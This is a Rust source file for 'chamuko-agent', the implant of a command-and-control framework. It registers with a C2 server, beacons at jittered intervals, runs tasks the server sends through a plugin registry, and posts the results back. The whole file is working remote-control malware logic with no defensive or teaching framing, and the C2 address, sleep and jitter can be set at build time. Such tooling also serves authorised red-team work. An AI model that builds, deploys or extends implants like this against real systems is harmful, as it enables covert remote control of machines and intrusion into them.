use std::env;
use std::process::ExitCode;
use std::time::Duration;

use chamuko_core::PluginRegistry;
use chamuko_plugin_api::LifecycleEvent;
use chamuko_protocol::{AgentInfo, TaskResult};

mod client;
mod commands;

use client::C2Client;
use commands::CoreCommands;

struct Config {
    c2_url: String,
    sleep: u64,
    jitter: u64,
    name: String,
    once: bool,
}

const FALLBACK_C2_URL: &str = "http://127.0.0.1:8080";
const FALLBACK_SLEEP: u64 = 10;
const FALLBACK_JITTER: u64 = 3;

fn default_c2_url() -> String {
    option_env!("CHAMUKO_C2_URL")
        .unwrap_or(FALLBACK_C2_URL)
        .to_string()
}

fn default_sleep() -> u64 {
    option_env!("CHAMUKO_SLEEP")
        .and_then(|s| s.parse().ok())
        .unwrap_or(FALLBACK_SLEEP)
}

fn default_jitter() -> u64 {
    option_env!("CHAMUKO_JITTER")
        .and_then(|s| s.parse().ok())
        .unwrap_or(FALLBACK_JITTER)
}

fn default_name() -> String {
    option_env!("CHAMUKO_NAME").unwrap_or("").to_string()
}

fn parse_u64(s: &str, fallback: u64) -> u64 {
    s.parse().unwrap_or(fallback)
}

impl Config {
    fn from_args() -> Self {
        let mut c2_url = default_c2_url();
        let mut sleep = default_sleep();
        let mut jitter = default_jitter();
        let mut name = default_name();
        let mut once = false;

        let args: Vec<String> = env::args().skip(1).collect();
        let mut i = 0;
        while i < args.len() {
            match args[i].as_str() {
                "--url" | "-u" => {
                    i += 1;
                    if let Some(v) = args.get(i) {
                        c2_url = v.clone();
                    }
                }
                "--sleep" | "-s" => {
                    i += 1;
                    if let Some(v) = args.get(i) {
                        sleep = parse_u64(v, sleep);
                    }
                }
                "--jitter" | "-j" => {
                    i += 1;
                    if let Some(v) = args.get(i) {
                        jitter = parse_u64(v, jitter);
                    }
                }
                "--name" | "-n" => {
                    i += 1;
                    if let Some(v) = args.get(i) {
                        name = v.clone();
                    }
                }
                "--once" => once = true,
                "--help" | "-h" => {
                    println!(
                        "chamuko-agent\n\
                         --url <url>     C2 server URL\n\
                         --sleep <s>     base beacon sleep seconds\n\
                         --jitter <s>    max random jitter seconds\n\
                         --name <name>   agent label\n\
                         --once          run a single beacon then exit\n\
                         --help          show this help"
                    );
                    std::process::exit(0);
                }
                other => eprintln!("unknown argument: {other}"),
            }
            i += 1;
        }

        Self {
            c2_url,
            sleep,
            jitter,
            name,
            once,
        }
    }
}

fn jitter_sleep(base: u64, jitter: u64) {
    let extra = if jitter > 0 {
        rand::random::<u64>() % jitter
    } else {
        0
    };
    std::thread::sleep(Duration::from_secs(base + extra));
}

fn execute_task(
    registry: &mut PluginRegistry,
    task: &chamuko_protocol::Task,
) -> TaskResult {
    let args: Vec<String> = task.args.clone();
    match registry.execute(&task.command, &args) {
        Some(Ok(out)) => TaskResult {
            task_id: task.id.clone(),
            output: out.stdout,
            error: None,
            exit_code: Some(out.exit_code),
        },
        Some(Err(e)) => TaskResult {
            task_id: task.id.clone(),
            output: String::new(),
            error: Some(e.to_string()),
            exit_code: None,
        },
        None => TaskResult {
            task_id: task.id.clone(),
            output: String::new(),
            error: Some(format!("no plugin handles command '{}'", task.command)),
            exit_code: None,
        },
    }
}

fn main() -> ExitCode {
    let config = Config::from_args();

    let mut registry = PluginRegistry::new();
    let core = CoreCommands::new();
    if let Err(e) = registry.register(Box::new(core)) {
        eprintln!("failed to register core plugin: {e}");
        return ExitCode::FAILURE;
    }

    let mut failures = registry.dispatch(LifecycleEvent::Startup);
    for f in &failures {
        eprintln!("{f}");
    }

    eprintln!(
        "chamuko-agent: {} plugin(s); C2={} sleep={}s jitter={}s name='{}'",
        registry.len(),
        config.c2_url,
        config.sleep,
        config.jitter,
        config.name
    );

    let client = C2Client::new(config.c2_url.clone());

    let mut info = AgentInfo::local(config.name.clone());
    let id = match client.register(&info) {
        Ok(resp) => {
            info.id = resp.id.clone();
            info.id.clone()
        }
        Err(e) => {
            eprintln!("registration failed: {e}");
            failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
            for f in &failures {
                eprintln!("{f}");
            }
            return ExitCode::FAILURE;
        }
    };
    eprintln!("registered as agent {id}");

    loop {
        jitter_sleep(config.sleep, config.jitter);

        let tasks = match client.beacon(&id) {
            Ok(resp) => resp.tasks,
            Err(e) => {
                eprintln!("beacon error: {e}");
                if config.once {
                    break;
                }
                continue;
            }
        };

        let mut results = Vec::with_capacity(tasks.len());
        for task in &tasks {
            let result = execute_task(&mut registry, task);
            if let Some(err) = &result.error {
                eprintln!("task {} error: {err}", task.id);
            }
            results.push(result);
        }

        if let Err(e) = client.post_results(&id, results) {
            eprintln!("failed to post results: {e}");
        }

        if config.once {
            break;
        }
    }

    failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
    for f in &failures {
        eprintln!("{f}");
    }

    if failures.is_empty() {
        ExitCode::SUCCESS
    } else {
        ExitCode::FAILURE
    }
}
